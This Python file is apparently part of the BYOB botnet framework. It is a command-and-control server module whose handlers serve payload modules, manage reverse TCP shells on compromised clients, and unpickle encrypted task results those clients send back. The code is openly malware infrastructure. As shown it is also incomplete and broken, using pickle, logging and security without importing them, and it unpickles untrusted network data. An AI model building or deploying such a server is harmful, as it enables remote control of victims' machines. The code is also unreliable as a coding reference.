#!/usr/bin/python
# -*- coding: utf-8 -*-

__doc__ = ''' 

  Request Handler
    handles HTTP requests for files, resources,
    packages, and any user-defined modules
    added to the 'remote' folder

  Task Handler
    handles incoming tasks completed by clients
    operating in passive mode and passes them to
    the database for storage

  Session Handler
    handles incoming client connections in
    separate threads which are each responsible
    for controlling their respective client's
    reverse TCP shell and adding/updating the
    database with the client’s sessions & tasks

'''

# standard library
import os
import sys
import json
import time
import struct
import socket
import select
import threading
import subprocess
import collections
import SimpleHTTPServer

# modules
import util

# packages
packages = ['SocketServer']
missing  = []
for __package in packages:
    try:
        exec("import {}".format(__package), globals())
    except ImportError:
        missing.append(__package)

# fix missing dependencies
if missing:
    proc = subprocess.Popen('{} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
    proc.wait()
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])

# main
class Server(SocketServer.ThreadingTCPServer):

    """ 
    Base server which can be combined with handlers from byob.core.handlers
    to create different types of server instances
    
    """

    allow_reuse_address = True

    def __init__(self, host='0.0.0.0', port=1337, handler=SimpleHTTPServer.SimpleHTTPRequestHandler):
        """

        `Optional`
        :param str host:        server hostname or IP address
        :param int port:        server port number

        Returns a byob.server.Server instance
        
        """
        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)

    @util.threaded
    def serve_until_stopped(self):
        """
        Run server while byob.server.Server.abort is False;
        abort execution if True
        
        """
        abort = False
        while True:
            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
            if rd:
                self.handle_request()
            abort = globals().get('__abort')
            if abort:
                break


class TaskHandler(SocketServer.StreamRequestHandler):
    """ 
    Task handler for the C2 server that handles
    incoming tasks from clients operating in 
    passive mode
    """

    def handle(self):
        """ 
        Unpack, decrypt, and unpickle an incoming
        completed task from a client, and pass it
        to the database for storage
        """
        while True:
            hdr_size = struct.calcsize('!L')
            hdr      = self.connection.recv(hdr_size)
            msg_size = struct.unpack('!L', hdr)[0]
            msg      = self.connection.recv(msg_size)
            while len(msg) < msg_size:
                msg += self.connection.recv(msg_size - len(msg))
            session = self.server._get_client_by_connection(self.connection)
            task    = pickle.loads(security.decrypt_aes(msg, session.key))
            if isinstance(task, logging.LogRecord):
                self.server.database.handle_task(task.__dict__)
            elif isinstance(task, dict):
                self.server.database.handle_task(task)
            else:
                util.debug("invalid task format - expected {}, received {}".format(dict, type(task)))


